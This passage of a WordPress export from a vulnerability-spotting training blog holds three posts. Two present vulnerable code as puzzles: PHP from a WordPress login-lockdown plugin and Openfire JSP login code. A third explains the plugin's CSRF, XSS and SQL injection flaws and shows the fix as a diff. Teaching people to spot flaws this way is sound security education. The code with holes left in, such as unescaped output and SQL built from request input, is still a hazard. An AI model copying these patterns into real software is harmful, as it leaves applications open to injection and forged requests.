		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="code-samples"><![CDATA[code samples]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="debugging"><![CDATA[debugging]]></category>
		<category domain="category" nicename="dojo"><![CDATA[DoJo]]></category>
		<category domain="post_tag" nicename="dojo-2"><![CDATA[Dojo]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="error-message"><![CDATA[error message]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="production-environment"><![CDATA[production environment]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="switch-cases"><![CDATA[switch cases]]></category>
		<category domain="post_tag" nicename="test"><![CDATA[test]]></category>
		<category domain="post_tag" nicename="testing-and-debugging"><![CDATA[testing and debugging]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dwAy57]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c6f9ad97053c90cbac7c12130197e976]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Country</title>
		<link>http://spotthevuln.com/2010/10/country/</link>
		<pubDate>Mon, 04 Oct 2010 15:00:05 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1129</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>You get weird and unsettling behavior in the country</strong><strong>.
</strong> <strong> -Sara Paretsky </strong></blockquote>
<pre lang="PHP" line="1"><?php

...<snip>...

function print_loginlockdownAdminPage() {
	global $wpdb;
	$table_name = $wpdb->prefix . "lockdowns";
	$loginlockdownAdminOptions = get_loginlockdownOptions();

	if (isset($_POST['update_loginlockdownSettings'])) {
		if (isset($_POST['ll_max_login_retries'])) {
			$loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];
		}
		if (isset($_POST['ll_retries_within'])) {
			$loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];
		}
		if (isset($_POST['ll_lockout_length'])) {
			$loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];
		}
		if (isset($_POST['ll_lockout_invalid_usernames'])) {
			$loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];
		}
		if (isset($_POST['ll_mask_login_errors'])) {
			$loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];
		}
		update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);
		?>
		
<div class="updated"><p><strong><?php _e("Settings Updated.", "loginlockdown");?></strong></p></div>
		<?php
	}
	if (isset($_POST['release_lockdowns'])) {
		if (isset($_POST['releaseme'])) {
			$released = $_POST['releaseme'];
			foreach ( $released as $release_id ) {
				$results = $wpdb->query("UPDATE $table_name SET release_date = now() " .
							"WHERE lockdown_ID = $release_id");
			}
		}
		update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);
		?>
		
<div class="updated"><p><strong><?php _e("Lockdowns Released.", "loginlockdown");?></strong></p></div>
		<?php
	}
	$dalist = listLockedDown();
?>
<div class=wrap>
<form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
<h2><?php _e('Login LockDown Options', 'loginlockdown') ?></h2>
<h3><?php _e('Max Login Retries', 'loginlockdown') ?></h3>
<input type="text" name="ll_max_login_retries" size="8" value="<?php echo $loginlockdownAdminOptions['max_login_retries']; ?>">
<h3><?php _e('Retry Time Period Restriction (minutes)', 'loginlockdown') ?></h3>
<input type="text" name="ll_retries_within" size="8" value="<?php echo $loginlockdownAdminOptions['retries_within']; ?>">
<h3><?php _e('Lockout Length (minutes)', 'loginlockdown') ?></h3>
<input type="text" name="ll_lockout_length" size="8" value="<?php echo $loginlockdownAdminOptions['lockout_length']; ?>">
<h3><?php _e('Lockout Invalid Usernames?', 'loginlockdown') ?></h3>
<input type="radio" name="ll_lockout_invalid_usernames" value="yes" <?php if( $loginlockdownAdminOptions['lockout_invalid_usernames'] == "yes" ) echo "checked"; ?>>&nbsp;Yes&nbsp;&nbsp;&nbsp;<input type="radio" name="ll_lockout_invalid_usernames" value="no" <?php if( $loginlockdownAdminOptions['lockout_invalid_usernames'] == "no" ) echo "checked"; ?>>&nbsp;No
<h3><?php _e('Mask Login Errors?', 'loginlockdown') ?></h3>
<input type="radio" name="ll_mask_login_errors" value="yes" <?php if( $loginlockdownAdminOptions['mask_login_errors'] == "yes" ) echo "checked"; ?>>&nbsp;Yes&nbsp;&nbsp;&nbsp;<input type="radio" name="ll_mask_login_errors" value="no" <?php if( $loginlockdownAdminOptions['mask_login_errors'] == "no" ) echo "checked"; ?>>&nbsp;No
<div class="submit">
<input type="submit" name="update_loginlockdownSettings" value="<?php _e('Update Settings', 'loginlockdown') ?>" /></div>
</form>
<br />
<form method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">
<h3><?php _e('Currently Locked Out', 'loginlockdown') ?></h3>
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1129</wp:post_id>
		<wp:post_date>2010-10-04 08:00:05</wp:post_date>
		<wp:post_date_gmt>2010-10-04 15:00:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>country</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/908xq0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[d99ce8f802c12ae780df3d9c9da8b36e]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>824</wp:comment_id>
			<wp:comment_author><![CDATA[Code Snippet Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/10/country-multiple-vulns/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-10-08 08:30:20</wp:comment_date>
			<wp:comment_date_gmt>2010-10-08 15:30:20</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Country [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Country - Multiple Vulns</title>
		<link>http://spotthevuln.com/2010/10/country-multiple-vulns/</link>
		<pubDate>Fri, 08 Oct 2010 15:00:27 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1144</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Loginlockdown plugin for WordPress

Fixed in Version: 1.5

Issue Type: CSRF, XSS, SQLi

Original Code: <a title="Country" href="http://spotthevuln.com/2010/10/country/" target="_blank">Found    Here</a>
<h2>Description</h2>
There were a ton of issues addressed in this patch.  Let’s start from the top and work our way down.  The first change we see is the addition of a nonce check (check_admin_referer()).  The counterpart  to check_admin_referer() is a function named wp_nonce_field(), which can be found on lines 56-59 and 80-83.  Lines 56-59 and 80-83 set the nonce/token in the HTML markup and check_admin_referer() later validates that the token is legitimate.  This is done to prevent Cross Site Request Forgery (CSRF).  Although no one symptom is a dead giveaway for CSRF, finding a FORM without a token/nonce as one of the INPUT fields is an indication that the request should be investigated.  If the request introduces a state changing operations (changing of a user setting, modification of data, installation/removal of a new feature…etc) it will need to be protected by a CSRF nonce.  This patch adds CSRF protections in a few different places.

The next issue is a classic SQL injection vulnerability.  In line 38 we see that the developer has set $_POST[‘releaseme’] to a variable named $released.  A few lines later, $released is used to build a dynamic SQL statement.  What’s interesting is $released is used at the end of a SQL statement and appears to be an integer, there could be other issues here if the escaping isn’t done properly :)

Next up is a slew of XSS bugs.  Lines 10-29 use various $_POST parameters to set a number of variables.  These variables are then used to build HTML markup in lines 54-78.  The developer addressed these XSS bugs by using the esc_attr() API before allowing PHP to echo the variable value.  The developer also echoed the $_SERVER[“REQUEST_URI”] value directly into HTML markup as well.  This variable represents the URI given in order to access the page and is considered tainted/attacker controlled.
<h2>Developers Solution</h2>
[sourcecode language="diff"]

&lt;?php

...&lt;snip&gt;...

function print_loginlockdownAdminPage() {
 global $wpdb;
 $table_name = $wpdb-&gt;prefix . &quot;lockdowns&quot;;
 $loginlockdownAdminOptions = get_loginlockdownOptions();

 if (isset($_POST['update_loginlockdownSettings'])) {
+        //wp_nonce check
+        check_admin_referer('login-lockdown_update-options');
 if (isset($_POST['ll_max_login_retries'])) {
 $loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];
 }
 if (isset($_POST['ll_retries_within'])) {
 $loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];
 }
 if (isset($_POST['ll_lockout_length'])) {
 $loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];
 }
 if (isset($_POST['ll_lockout_invalid_usernames'])) {
 $loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];
 }
 if (isset($_POST['ll_mask_login_errors'])) {
 $loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];
 }
 update_option(&quot;loginlockdownAdminOptions&quot;, $loginlockdownAdminOptions);
 ?&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e(&quot;Settings Updated.&quot;, &quot;loginlockdown&quot;);?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;?php
 }
 if (isset($_POST['release_lockdowns'])) {
+        //wp_nonce check
+        check_admin_referer('login-lockdown_release-lockdowns');
 if (isset($_POST['releaseme'])) {
 $released = $_POST['releaseme'];
 foreach ( $released as $release_id ) {
 $results = $wpdb-&gt;query(&quot;UPDATE $table_name SET release_date = now() &quot; .
-                            &quot;WHERE lockdown_ID = $release_id&quot;);
+                            &quot;WHERE lockdown_ID = &quot; . $wpdb-&gt;escape($release_id) . &quot;&quot;);
 }
 }
 update_option(&quot;loginlockdownAdminOptions&quot;, $loginlockdownAdminOptions);
 ?&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e(&quot;Lockdowns Released.&quot;, &quot;loginlockdown&quot;);?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;?php
 }
 $dalist = listLockedDown();
?&gt;
&lt;div&gt;
-&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;REQUEST_URI&quot;]; ?&gt;&quot;&gt;
+&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo esc_attr($_SERVER[&quot;REQUEST_URI&quot;]); ?&gt;&quot;&gt;
+&lt;?php
+if ( function_exists('wp_nonce_field') )
+    wp_nonce_field('login-lockdown_update-options');
+?&gt;
&lt;h2&gt;&lt;?php _e('Login LockDown Options', 'loginlockdown') ?&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;?php _e('Max Login Retries', 'loginlockdown') ?&gt;&lt;/h3&gt;
-&lt;input type=&quot;text&quot; name=&quot;ll_max_login_retries&quot; size=&quot;8&quot; value=&quot;&lt;?php echo $loginlockdownAdminOptions['max_login_retries']; ?&gt;&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;ll_max_login_retries&quot; size=&quot;8&quot; value=&quot;&lt;?php echo esc_attr($loginlockdownAdminOptions['max_login_retries']); ?&gt;&quot;&gt;
&lt;h3&gt;&lt;?php _e('Retry Time Period Restriction (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;
-&lt;input type=&quot;text&quot; name=&quot;ll_retries_within&quot; size=&quot;8&quot; value=&quot;&lt;?php echo $loginlockdownAdminOptions['retries_within']; ?&gt;&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;ll_retries_within&quot; size=&quot;8&quot; value=&quot;&lt;?php echo esc_attr($loginlockdownAdminOptions['retries_within']); ?&gt;&quot;
&lt;h3&gt;&lt;?php _e('Lockout Length (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;
-&lt;input type=&quot;text&quot; name=&quot;ll_lockout_length&quot; size=&quot;8&quot; value=&quot;&lt;?php echo $loginlockdownAdminOptions['lockout_length']; ?&gt;&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;ll_lockout_length&quot; size=&quot;8&quot; value=&quot;&lt;?php echo esc_attr($loginlockdownAdminOptions['lockout_length']); ?&gt;&quot;
&lt;h3&gt;&lt;?php _e('Lockout Invalid Usernames?', 'loginlockdown') ?&gt;&lt;/h3&gt;
&lt;input type=&quot;radio&quot; name=&quot;ll_lockout_invalid_usernames&quot; value=&quot;yes&quot; &lt;?php if( $loginlockdownAdminOptions['lockout_invalid_usernames'] == &quot;yes&quot; ) echo &quot;checked&quot;; ?&gt;&gt;&amp;nbsp;Yes&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;radio&quot; name=&quot;ll_lockout_invalid_usernames&quot; value=&quot;no&quot; &lt;?php if( $loginlockdownAdminOptions['lockout_invalid_usernames'] == &quot;no&quot; ) echo &quot;checked&quot;; ?&gt;&gt;&amp;nbsp;No
&lt;h3&gt;&lt;?php _e('Mask Login Errors?', 'loginlockdown') ?&gt;&lt;/h3&gt;
&lt;input type=&quot;radio&quot; name=&quot;ll_mask_login_errors&quot; value=&quot;yes&quot; &lt;?php if( $loginlockdownAdminOptions['mask_login_errors'] == &quot;yes&quot; ) echo &quot;checked&quot;; ?&gt;&gt;&amp;nbsp;Yes&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;radio&quot; name=&quot;ll_mask_login_errors&quot; value=&quot;no&quot; &lt;?php if( $loginlockdownAdminOptions['mask_login_errors'] == &quot;no&quot; ) echo &quot;checked&quot;; ?&gt;&gt;&amp;nbsp;No
&lt;div&gt;
&lt;input type=&quot;submit&quot; name=&quot;update_loginlockdownSettings&quot; value=&quot;&lt;?php _e('Update Settings', 'loginlockdown') ?&gt;&quot; /&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;br /&gt;
-&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;REQUEST_URI&quot;]; ?&gt;&quot;&gt;
+&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo esc_attr($_SERVER[&quot;REQUEST_URI&quot;]); ?&gt;&quot;&gt;
+&lt;?php
+if ( function_exists('wp_nonce_field') )
+    wp_nonce_field('login-lockdown_release-lockdowns');
+?&gt;
&lt;h3&gt;&lt;?php _e('Currently Locked Out', 'loginlockdown') ?&gt;&lt;/h3&gt;

[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1144</wp:post_id>
		<wp:post_date>2010-10-08 08:00:27</wp:post_date>
		<wp:post_date_gmt>2010-10-08 15:00:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>country-multiple-vulns</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cmdkA2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e712adbf81fb7f5e6cd072c89a208079]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Beer</title>
		<link>http://spotthevuln.com/2010/10/beer/</link>
		<pubDate>Mon, 11 Oct 2010 15:00:52 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1150</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Beer, it's the best damn drink in the world</strong><strong>.
</strong> <strong> -Jack Nicholson</strong></blockquote>
<code>
<pre lang="java">   
     /**
     * This method takes a string which may contain HTML tags (ie, &lt;b&gt;,
     * &lt;table&gt;, etc) and converts the '&lt'' and '&gt;' characters to
     * their HTML escape sequences. It will also replace LF  with &lt;br&gt;.
     *
     * @param in the text to be converted.
     * @return the input string with the characters '&lt;' and '&gt;' replaced
     *         with their HTML escape sequences.
     */
    public static String escapeHTMLTags(String in) {
        if (in == null) {
            return null;
        }
        char ch;
        int i = 0;
        int last = 0;
        char[] input = in.toCharArray();
        int len = input.length;
        StringBuilder out = new StringBuilder((int)(len * 1.3));
        for (; i < len; i++) {
            ch = input[i];
            if (ch > '>') {
            }
            else if (ch == '<') {
                if (i > last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append(LT_ENCODE);
            }
            else if (ch == '>') {
                if (i > last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append(GT_ENCODE);
            }
            else if (ch == '\n') {
                if (i > last) {
                    out.append(input, last, i - last);
                }
                last = i + 1;
                out.append("<br>");
            }
        }
        if (last == 0) {
            return in;
        }
        if (i > last) {
            out.append(input, last, i - last);
        }
        return out.toString();
    }

... <snip> ...

<% // get parameters
    String username = ParamUtils.getParameter(request, "username");

    String password = ParamUtils.getParameter(request, "password");
    String url = ParamUtils.getParameter(request, "url");
    url = org.jivesoftware.util.StringUtils.escapeHTMLTags(url);

    // SSO between cluster nodes
    String secret = ParamUtils.getParameter(request, "secret");
    String nodeID = ParamUtils.getParameter(request, "nodeID");
    String nonce = ParamUtils.getParameter(request, "nonce");

    // The user auth token:
    AuthToken authToken = null;

    // Check the request/response for a login token

    Map<String, String> errors = new HashMap<String, String>();

    if (ParamUtils.getBooleanParameter(request, "login")) {
        String loginUsername = username;
        if (loginUsername != null) {
            loginUsername = JID.escapeNode(loginUsername);
        }
        try {
            if (secret != null && nodeID != null) {
                if (StringUtils.hash(AdminConsolePlugin.secret).equals(secret) && ClusterManager.isClusterMember(Base64.decode(nodeID, Base64.URL_SAFE))) {
                    authToken = new AuthToken(loginUsername);
                }
                else if ("clearspace".equals(nodeID) && ClearspaceManager.isEnabled()) {
                    ClearspaceManager csmanager = ClearspaceManager.getInstance();
                    String sharedSecret = csmanager.getSharedSecret();
                    if (nonce == null || sharedSecret == null || !csmanager.isValidNonce(nonce) ||
                            !StringUtils.hash(loginUsername + ":" + sharedSecret + ":" + nonce).equals(secret)) {
                        throw new UnauthorizedException("SSO failed. Invalid secret was provided");
                    }
                    authToken = new AuthToken(loginUsername);
                }
                else {
                    throw new UnauthorizedException("SSO failed. Invalid secret or node ID was provided");
                }
            }
            else {
                // Check that a username was provided before trying to verify credentials
                if (loginUsername != null) {
                    if (LoginLimitManager.getInstance().hasHitConnectionLimit(loginUsername, request.getRemoteAddr())) {
                        throw new UnauthorizedException("User '" + loginUsername +"' or address '" + request.getRemoteAddr() + "' has his login attempt limit.");
                    }
                    if (!AdminManager.getInstance().isUserAdmin(loginUsername, true)) {
                        throw new UnauthorizedException("User '" + loginUsername + "' not allowed to login.");
                    }
                    authToken = AuthFactory.authenticate(loginUsername, password);
                }
                else {
                    errors.put("unauthorized", LocaleUtils.getLocalizedString("login.failed.unauthorized"));
                }
            }

... <snip> ...

    // Escape HTML tags in username to prevent cross-site scripting attacks. This
    // is necessary because we display the username in the page below.
    username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);

%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
	<title><%= AdminConsole.getAppName() %> <fmt:message key="login.title" /></title>
	<script language="JavaScript" type="text/javascript">
		<!--
		// break out of frames
		if (self.parent.frames.length != 0) {
			self.parent.location=document.location;
		}
        function updateFields(el) {
            if (el.checked) {
                document.loginForm.username.disabled = true;
                document.loginForm.password.disabled = true;
            }
            else {
                document.loginForm.username.disabled = false;
                document.loginForm.password.disabled = false;
                document.loginForm.username.focus();
            }
        }
		//-->
	</script>
    <link rel="stylesheet" href="style/global.css" type="text/css">
    <link rel="stylesheet" href="style/login.css" type="text/css">
</head>

<body>

<form action="login.jsp" name="loginForm" method="post">

<%  if (url != null) { try { %>

    <input type="hidden" name="url" value="<%= url %>">

<%  } catch (Exception e) { Log.error(e); } } %>

<input type="hidden" name="login" value="true">

<div align="center">
    <!-- BEGIN login box -->
    <div id="jive-loginBox">
        
        <div align="center" id="jive-loginTable">

            <span id="jive-login-header" style="background: transparent url(images/login_logo.gif) no-repeat left; padding: 29px 0 10px 205px;">
            <fmt:message key="admin.console" />
            </span>

            <div style="text-align: center; width: 380px;">
            <table cellpadding="0" cellspacing="0" border="0" align="center">
                <tr>
                    <td align="right" class="loginFormTable">

                        <table cellpadding="2" cellspacing="0" border="0">
                        <noscript>
                            <tr>
                                <td colspan="3">
                                    <table cellpadding="0" cellspacing="0" border="0">
                                    <tr valign="top">
                                        <td><img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"></td>
                                        <td><div class="jive-error-text" style="padding-left:5px; color:#cc0000;"><fmt:message key="login.error" /></div></td>
                                    </tr>
                                    </table>
                                </td>
                            </tr>
                        </noscript>
                        <%  if (errors.size() > 0) { %>
                            <tr>
                                <td colspan="3">
                                    <table cellpadding="0" cellspacing="0" border="0">
                                        <% for (String error:errors.values()) { %>
                                    <tr valign="top">
                                        <td><img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"></td>
                                        <td><div class="jive-error-text" style="padding-left:5px; color:#cc0000;"><%= error%></div></td>
                                    </tr>
                                        <% } %>
                                    </table>
                                </td>
                            </tr>
                        <%  } %>
                        <tr>
                            <td><input type="text" name="username" size="15" maxlength="50" id="u01" value="<%= (username != null ? username : "") %>"></td>
                            <td><input type="password" name="password" size="15" maxlength="50" id="p01"></td>
                            <td align="center"><input type="submit" value="&nbsp; <fmt:message key="login.login" /> &nbsp;"></td>
                        </tr>
                        <tr valign="top">
                            <td class="jive-login-label"><label for="u01"><fmt:message key="login.username" /></label></td>
                            <td class="jive-login-label"><label for="p01"><fmt:message key="login.password" /></label></td>
                            <td>&nbsp;</td>
                        </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td align="right">
                        <div align="right" id="jive-loginVersion">
                        <%= AdminConsole.getAppName() %>, <fmt:message key="login.version" />: <%= AdminConsole.getVersionString() %>
                        </div>
                    </td>
                </tr>
            </table>
            </div>
        </div>

    </div>
    <!-- END login box -->
</div>

</form>

<script language="JavaScript" type="text/javascript">
<!--
    if (document.loginForm.username.value == '')  {
	    document.loginForm.username.focus();
    } else {
        document.loginForm.password.focus();
    }
//-->
</script>

</body>
</html>
</pre>
﻿</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1150</wp:post_id>
		<wp:post_date>2010-10-11 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-10-11 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>beer</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dklt9q]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8dd2f1d6c9e76c00409889905d6beeea]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>841</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), Java, Openfire, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/10/beer-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-10-15 08:02:28</wp:comment_date>
			<wp:comment_date_gmt>2010-10-15 15:02:28</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Beer [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>829</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/10/beer/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-10-11 08:30:33</wp:comment_date>
